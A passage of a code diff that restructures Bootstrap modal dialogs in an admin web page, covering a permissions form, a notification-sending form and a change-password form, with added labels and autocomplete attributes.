+                        <div class="form-check"><input type="checkbox" id="permCanDelete" class="form-check-input"><label class="form-check-label" for="permCanDelete">Delete</label></div>
+                        <div class="form-check"><input type="checkbox" id="permCanCmd" class="form-check-input"><label class="form-check-label" for="permCanCmd">Send Commands</label></div>
+                    </div>
+                    <button class="btn btn-primary" onclick="addPermission()"><i class="fas fa-plus"></i> Add Permission</button>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
     </div>
 
     <!-- Notification Modal -->
     <div class="modal fade" id="notificationModal" tabindex="-1">
-        <div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5><i class="fas fa-bell"></i> Send Notification</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
-        <div class="modal-body">
-            <select id="notifUserId" class="form-select mb-3"><option value="all">All Users</option></select>
-            <input type="text" id="notifTitle" class="form-control mb-3" placeholder="Title">
-            <textarea id="notifMessage" class="form-control mb-3" rows="3" placeholder="Message"></textarea>
-            <select id="notifType" class="form-select"><option value="info">Info</option><option value="success">Success</option><option value="warning">Warning</option><option value="danger">Danger</option></select>
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-bell"></i> Send Notification</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="mb-3">
+                        <label class="form-label">Recipient</label>
+                        <select id="notifUserId" class="form-select"><option value="all">All Users</option></select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Title <span class="text-danger">*</span></label>
+                        <input type="text" id="notifTitle" class="form-control" placeholder="Notification title">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Message <span class="text-danger">*</span></label>
+                        <textarea id="notifMessage" class="form-control" rows="3" placeholder="Notification message"></textarea>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Type</label>
+                        <select id="notifType" class="form-select">
+                            <option value="info">Info</option>
+                            <option value="success">Success</option>
+                            <option value="warning">Warning</option>
+                            <option value="danger">Danger</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button class="btn btn-primary" onclick="sendNotification()"><i class="fas fa-paper-plane"></i> Send</button>
+                </div>
+            </div>
         </div>
-        <div class="modal-footer"><button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button class="btn btn-primary" onclick="sendNotification()">Send</button></div></div></div>
     </div>
 
     <!-- Password Modal -->
     <div class="modal fade" id="passwordModal" tabindex="-1">
-        <div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5><i class="fas fa-key"></i> Change Password</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div>
-        <div class="modal-body">
-            <input type="password" id="currentPassword" class="form-control mb-3" placeholder="Current Password">
-            <input type="password" id="newPassword" class="form-control mb-3" placeholder="New Password">
-            <input type="password" id="confirmPassword" class="form-control mb-3" placeholder="Confirm Password">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-key"></i> Change Password</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="mb-3">
+                        <label class="form-label">Current Password</label>
+                        <input type="password" id="currentPassword" class="form-control" autocomplete="current-password">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">New Password</label>
+                        <input type="password" id="newPassword" class="form-control" autocomplete="new-password">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Confirm New Password</label>
+                        <input type="password" id="confirmPassword" class="form-control" autocomplete="new-password">
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button class="btn btn-primary" onclick="updatePassword()"><i class="fas fa-save"></i> Update Password</button>
+                </div>
+            </div>
         </div>
-        <div class="modal-footer"><button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button class="btn btn-primary" onclick="updatePassword()">Update Password</button></div></div></div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
